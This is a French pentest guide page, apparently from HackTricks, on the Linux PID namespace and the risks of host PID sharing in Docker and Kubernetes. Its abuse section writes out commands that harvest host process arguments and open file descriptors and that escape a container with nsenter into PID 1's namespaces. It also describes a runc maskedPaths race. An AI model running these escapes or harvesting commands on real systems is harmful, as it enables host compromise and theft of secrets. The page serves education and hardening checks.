# Espace de noms PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

L'espace de noms PID contrôle la façon dont les processus sont numérotés et quels processus sont visibles. C'est pourquoi un conteneur peut avoir son propre PID 1 même s'il n'est pas une véritable machine. À l'intérieur de l'espace de noms, la charge de travail voit ce qui ressemble à un arbre de processus local. En dehors de l'espace de noms, l'hôte voit toujours les PID réels de l'hôte et l'ensemble du paysage des processus.

D'un point de vue sécurité, l'espace de noms PID est important car la visibilité des processus a de la valeur. Une fois qu'une charge de travail peut voir les processus de l'hôte, elle peut être capable d'observer les noms de services, les arguments de ligne de commande, les secrets passés dans les arguments des processus, l'état dérivé de l'environnement via `/proc`, et d'éventuelles cibles d'entrée dans les namespaces. Si elle peut faire plus que simplement voir ces processus, par exemple en envoyant des signaux ou en utilisant ptrace dans les bonnes conditions, le problème devient bien plus sérieux.

## Fonctionnement

Un nouvel espace de noms PID commence avec sa propre numérotation interne des processus. Le premier processus créé à l'intérieur devient PID 1 du point de vue de l'espace de noms, ce qui signifie aussi qu'il bénéficie de sémantiques particulières de type init pour les enfants orphelins et le comportement des signaux. Cela explique beaucoup d'étrangetés des conteneurs autour des processus init, du ramassage des zombies et pourquoi de petits wrappers init sont parfois utilisés dans les conteneurs.

La leçon de sécurité importante est qu'un processus peut sembler isolé parce qu'il ne voit que son propre arbre PID, mais cette isolation peut être délibérément levée. Docker expose cela via `--pid=host`, tandis que Kubernetes le fait via `hostPID: true`. Une fois que le conteneur rejoint l'espace de noms PID de l'hôte, la charge de travail voit directement les processus de l'hôte, et de nombreux chemins d'attaque deviennent alors beaucoup plus réalistes.

## Laboratoire

Pour créer un espace de noms PID manuellement:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Le shell voit maintenant une vue privée des processus. L'option `--mount-proc` est importante car elle monte une instance procfs qui correspond au nouveau PID namespace, rendant la liste des processus cohérente depuis l'intérieur.

Pour comparer le comportement du conteneur :
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La différence est immédiate et facile à comprendre, ce qui fait de ce laboratoire un bon premier exercice pour les lecteurs.

## Utilisation à l'exécution

Les conteneurs normaux dans Docker, Podman, containerd et CRI-O obtiennent leur propre espace de noms PID. Les Pods Kubernetes reçoivent généralement aussi une vue PID isolée, sauf si la charge de travail demande explicitement le partage du PID de l'hôte. Les environnements LXC/Incus reposent sur la même primitive du noyau, bien que les cas d'utilisation de conteneurs système puissent exposer des arbres de processus plus complexes et encourager des raccourcis de débogage.

La même règle s'applique partout : si le runtime a choisi de ne pas isoler l'espace de noms PID, c'est une réduction délibérée de la frontière du conteneur.

## Mauvaises configurations

La mauvaise configuration canonique est le partage du PID de l'hôte. Les équipes le justifient souvent pour le débogage, la surveillance ou la commodité de gestion des services, mais cela doit toujours être traité comme une exception de sécurité significative. Même si le conteneur n'a pas de primitive d'écriture immédiate sur les processus de l'hôte, la seule visibilité peut révéler beaucoup sur le système. Une fois que des capacités telles que `CAP_SYS_PTRACE` ou un accès utile à procfs sont ajoutées, le risque augmente considérablement.

Une autre erreur est de supposer que parce que la charge de travail ne peut pas tuer ou ptrace les processus de l'hôte par défaut, le partage du PID de l'hôte est donc sans danger. Cette conclusion ignore la valeur de l'énumération, la disponibilité de cibles permettant l'entrée dans un espace de noms, et la manière dont la visibilité des PID se combine avec d'autres contrôles affaiblis.

## Abuse

Si l'espace de noms PID de l'hôte est partagé, un attaquant peut inspecter les processus de l'hôte, récolter les arguments des processus, identifier des services intéressants, localiser des PIDs candidats pour `nsenter`, ou combiner la visibilité des processus avec des privilèges liés à ptrace pour interférer avec les charges de travail de l'hôte ou voisines. Dans certains cas, voir simplement le bon processus de longue durée suffit à remodeler le reste du plan d'attaque.

La première étape pratique est toujours de confirmer que les processus de l'hôte sont vraiment visibles :
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Une fois que les PIDs de l'hôte sont visibles, les arguments des processus et les cibles d'entrée de namespace deviennent souvent la source d'information la plus utile :
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` est disponible et que les privilèges sont suffisants, tester si un processus hôte visible peut être utilisé comme pont d'espace de noms :
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Même lorsque l'accès est bloqué, le partage des PID de l'hôte est déjà précieux car il révèle la disposition des services, les composants en cours d'exécution et les processus privilégiés candidats à cibler ensuite.

La visibilité des PID de l'hôte rend également l'abus des descripteurs de fichier plus réaliste. Si un processus privilégié de l'hôte ou une workload voisine a un fichier ou un socket sensible ouvert, l'attaquant peut être en mesure d'inspecter `/proc/<pid>/fd/` et de réutiliser ce descripteur selon la propriété, les options de montage procfs et le modèle de service cible.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ces commandes sont utiles car elles permettent de savoir si `hidepid=1` ou `hidepid=2` réduit la visibilité entre processus et si des descripteurs manifestement intéressants, tels que des fichiers secrets ouverts, des logs ou des sockets Unix, sont visibles.

### Exemple complet : PID hôte + `nsenter`

Le partage du PID de l'hôte devient un échappement direct vers l'hôte lorsque le processus dispose également de suffisamment de privilèges pour rejoindre les namespaces de l'hôte :
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si la commande réussit, le processus du conteneur s'exécute désormais dans les mount, UTS, network, IPC et PID namespaces de l'hôte. L'impact est une compromission immédiate de l'hôte.

Même lorsque `nsenter` lui-même est absent, le même résultat peut être obtenu via le binaire de l'hôte si le système de fichiers de l'hôte est monté :
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notes récentes d'exécution

Certaines attaques pertinentes au PID-namespace ne sont pas des mauvaises configurations traditionnelles `hostPID: true`, mais des bugs d'implémentation à l'exécution concernant la manière dont les protections procfs sont appliquées lors de la création du conteneur.

#### `maskedPaths` course vers le procfs de l'hôte

Dans les versions vulnérables de `runc`, des attaquants capables de contrôler l'image du conteneur ou la charge `runc exec` pouvaient provoquer une condition de course pendant la phase de masquage en remplaçant `/dev/null` côté conteneur par un lien symbolique vers un chemin procfs sensible tel que `/proc/sys/kernel/core_pattern`. Si la course réussissait, le bind mount du chemin masqué pouvait atterrir sur la mauvaise cible et exposer des paramètres procfs globaux de l'hôte au nouveau conteneur.

Commande utile pour vérification :
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Ceci est important parce que l'impact final peut être le même qu'une exposition directe de procfs : `core_pattern` ou `sysrq-trigger` modifiables en écriture, suivi d'une exécution de code sur l'hôte ou d'un denial of service.

#### Injection de namespace avec `insject`

Des outils d'injection de namespace comme `insject` montrent que l'interaction avec le PID-namespace n'exige pas toujours d'entrer préalablement dans le namespace cible avant la création du processus. Un helper peut s'y attacher plus tard, utiliser `setns()`, et s'exécuter tout en conservant la visibilité dans l'espace PID cible :
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Cette sorte de technique est principalement importante pour le débogage avancé, les outils offensifs et les workflows post-exploitation où le contexte de namespace doit être rejoint après que le runtime a déjà initialisé la charge de travail.

### Related FD Abuse Patterns

Two patterns are worth calling out explicitly when host PIDs are visible. First, a privileged process may keep a sensitive file descriptor open across `execve()` because it was not marked `O_CLOEXEC`. Second, services may pass file descriptors over Unix sockets through `SCM_RIGHTS`. In both cases the interesting object is not the pathname anymore, but the already-open handle that a lower-privilege process may inherit or receive.

This matters in container work because the handle may point to `docker.sock`, a privileged log, a host secret file, or another high-value object even when the path itself is not directly reachable from the container filesystem.

## Vérifications

Le but de ces commandes est de déterminer si le processus a une vue PID privée ou s'il peut déjà énumérer un paysage de processus beaucoup plus large.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Si la liste des processus contient des services évidents de l'hôte, le partage des PID de l'hôte est probablement déjà activé.
- Ne voir qu'une toute petite arborescence locale au conteneur est la base normale ; voir `systemd`, `dockerd`, ou des daemons non liés ne l'est pas.
- Une fois que les PID de l'hôte sont visibles, même les informations de processus en lecture seule deviennent utiles pour la reconnaissance.

Si vous découvrez qu'un conteneur s'exécute avec le partage des PID de l'hôte, ne le considérez pas comme une différence cosmétique. C'est un changement majeur dans ce que la charge de travail peut observer et potentiellement affecter.
